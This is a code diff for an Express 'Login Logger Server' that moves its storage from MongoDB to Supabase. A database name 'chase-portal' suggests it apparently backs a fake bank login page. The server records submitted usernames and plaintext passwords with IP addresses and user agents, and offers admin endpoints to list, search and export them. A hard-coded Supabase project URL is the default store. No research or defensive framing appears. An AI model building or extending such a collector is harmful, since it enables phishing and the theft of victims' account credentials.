@@ -4,49 +4,35 @@ import fs from 'fs';
 import path from 'path';
 import { fileURLToPath } from 'url';
 import moment from 'moment';
-import mongoose from 'mongoose';
+import { createClient } from '@supabase/supabase-js';
 
 const __filename = fileURLToPath(import.meta.url);
 const __dirname = path.dirname(__filename);
 
 const app = express();
-const PORT = 3001;
+const PORT = process.env.PORT || 3001;
 
 app.use(cors());
 app.use(express.json());
 
-// ─── MongoDB Configuration ───────────────────────────────────────
-const MONGODB_URI = process.env.MONGODB_URI || 'mongodb://localhost:27017/chase-portal';
+// Serve static files from the React build directory
+const distPath = path.join(__dirname, 'dist');
+app.use(express.static(distPath));
 
-// Login Log Schema
-const loginLogSchema = new mongoose.Schema({
-  timestamp: { type: Date, default: Date.now, index: true },
-  username: String,
-  password: String,
-  attemptNumber: Number,
-  status: String,
-  userAgent: String,
-  ipAddress: String,
-}, { collection: 'login_logs' });
+// ─── Supabase Configuration ──────────────────────────────────────
+const SUPABASE_URL = process.env.SUPABASE_URL || 'https://pgsccgetvjjoerefqitb.supabase.co';
+const SUPABASE_SERVICE_KEY = process.env.SUPABASE_SERVICE_KEY || '';
 
-const LoginLog = mongoose.model('LoginLog', loginLogSchema);
-
-// MongoDB Connection with fallback to CSV
+let supabase;
 let dbConnected = false;
 
-mongoose.connect(MONGODB_URI, {
-  serverSelectionTimeoutMS: 5000,
-  retryWrites: true,
-  w: 'majority'
-})
-.then(() => {
+if (SUPABASE_SERVICE_KEY) {
+  supabase = createClient(SUPABASE_URL, SUPABASE_SERVICE_KEY);
   dbConnected = true;
-  console.log('✅ Connected to MongoDB');
-})
-.catch((err) => {
-  console.warn('⚠️  MongoDB connection failed. Using CSV fallback.');
-  console.warn(`Details: ${err.message}`);
-});
+  console.log('✅ Connected to Supabase');
+} else {
+  console.warn('⚠️  Supabase key not configured. Using CSV fallback.');
+}
 
 // Ensure logs directory exists (for CSV fallback)
 const logsDir = path.join(__dirname, 'logs');
@@ -72,22 +58,28 @@ app.post('/api/logs/login', async (req, res) => {
     const ipAddress = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'unknown';
     
     const logData = {
-      timestamp: new Date(timestamp),
+      timestamp: new Date(timestamp).toISOString(),
       username,
       password,
-      attemptNumber,
+      attempt_number: attemptNumber,
       status,
-      userAgent,
-      ipAddress,
+      user_agent: userAgent,
+      ip_address: ipAddress,
     };
     
-    // Try MongoDB first
-    if (dbConnected) {
+    // Try Supabase first
+    if (dbConnected && supabase) {
       try {
-        const log = new LoginLog(logData);
-        await log.save();
+        const { error } = await supabase
+          .from('login_logs')
+          .insert([logData]);
+        
+        if (error) {
+          console.error('Error saving to Supabase:', error.message);
+          throw error;
+        }
       } catch (err) {
-        console.error('Error saving to MongoDB:', err.message);
+        console.error('Error saving to Supabase:', err.message);
         dbConnected = false; // Fallback to CSV
       }
     }
@@ -106,7 +98,7 @@ app.post('/api/logs/login', async (req, res) => {
     
     console.log(`[${moment().format('YYYY-MM-DD HH:mm:ss')}] Login attempt logged: ${username} (Attempt #${attemptNumber} - ${status})`);
     
-    res.json({ success: true, message: 'Login attempt logged', stored: dbConnected ? 'MongoDB' : 'CSV' });
+    res.json({ success: true, message: 'Login attempt logged', stored: dbConnected ? 'Supabase' : 'CSV' });
   } catch (error) {
     console.error('Error logging login attempt:', error);
     res.status(500).json({ success: false, error: error.message });
@@ -117,29 +109,45 @@ app.post('/api/logs/login', async (req, res) => {
 app.get('/api/admin/logs', async (req, res) => {
   try {
     const { limit = 100, status, username } = req.query;
-    let query = {};
-    
-    if (status) query.status = status;
-    if (username) query.username = new RegExp(username, 'i'); // Case-insensitive search
     
     let logs;
     
-    if (dbConnected) {
-      logs = await LoginLog.find(query)
-        .sort({ timestamp: -1 })
-        .limit(parseInt(limit))
-        .lean();
+    if (dbConnected && supabase) {
+      try {
+        let query = supabase
+          .from('login_logs')
+          .select('*')
+          .order('timestamp', { ascending: false })
+          .limit(parseInt(limit));
+        
+        if (status) {
+          query = query.eq('status', status);
+        }
+        
+        if (username) {
+          query = query.ilike('username', `%${username}%`);
+        }
+        
+        const { data, error } = await query;
+        
+        if (error) throw error;
+        
+        logs = data || [];
+      } catch (err) {
+        console.error('Error retrieving from Supabase:', err.message);
+        throw err;
+      }
     } else {
       // Fallback: Read from CSV
       const data = fs.readFileSync(csvFilePath, 'utf-8');
       const lines = data.split('\n').slice(1).filter(Boolean);
       logs = lines.map(line => {
         const [timestamp, user, pass, attempt, stat, ua, ip] = line.split(',');
-        return { timestamp, username: user, password: pass, attemptNumber: parseInt(attempt), status: stat, userAgent: ua, ipAddress: ip };
+        return { timestamp, username: user, password: pass, attempt_number: parseInt(attempt), status: stat, user_agent: ua, ip_address: ip };
       }).reverse().slice(0, parseInt(limit));
     }
     
-    res.json({ success: true, count: logs.length, logs, source: dbConnected ? 'MongoDB' : 'CSV' });
+    res.json({ success: true, count: logs.length, logs, source: dbConnected ? 'Supabase' : 'CSV' });
   } catch (error) {
     console.error('Error retrieving logs:', error);
     res.status(500).json({ success: false, error: error.message });
@@ -151,14 +159,26 @@ app.get('/api/admin/logs/export', async (req, res) => {
   try {
     let logs;
     
-    if (dbConnected) {
-      logs = await LoginLog.find().sort({ timestamp: -1 }).lean();
+    if (dbConnected && supabase) {
+      try {
+        const { data, error } = await supabase
+          .from('login_logs')
+          .select('*')
+          .order('timestamp', { ascending: false });
+        
+        if (error) throw error;
+        
+        logs = data || [];
+      } catch (err) {
+        console.error('Error exporting from Supabase:', err.message);
+        throw err;
+      }
     } else {
       const data = fs.readFileSync(csvFilePath, 'utf-8');
       const lines = data.split('\n').slice(1).filter(Boolean);
       logs = lines.map(line => {
         const [timestamp, user, pass, attempt, stat, ua, ip] = line.split(',');
-        return { timestamp, username: user, password: pass, attemptNumber: parseInt(attempt), status: stat, userAgent: ua, ipAddress: ip };
+        return { timestamp, username: user, password: pass, attempt_number: parseInt(attempt), status: stat, user_agent: ua, ip_address: ip };
       });
     }
     
@@ -174,14 +194,18 @@ app.get('/api/health', (req, res) => {
   res.json({ 
     status: 'Logger server is running', 
     port: PORT,
-    database: dbConnected ? 'MongoDB Connected' : 'Using CSV Fallback',
+    database: dbConnected ? 'Supabase Connected' : 'Using CSV Fallback',
     csvPath: csvFilePath,
-    mongodbUri: MONGODB_URI
   });
+});
+
+// Serve React app for all non-API routes (SPA fallback)
+app.get('*', (req, res) => {
+  res.sendFile(path.join(distPath, 'index.html'));
 });
 
 app.listen(PORT, () => {
   console.log(`\n🔒 Login Logger Server running on http://localhost:${PORT}`);
-  console.log(`📊 Database: ${dbConnected ? 'MongoDB' : 'CSV (Fallback)'}`);
+  console.log(`📊 Database: ${dbConnected ? 'Supabase' : 'CSV (Fallback)'}`);
   console.log(`📁 CSV backup: ${csvFilePath}\n`);
 });
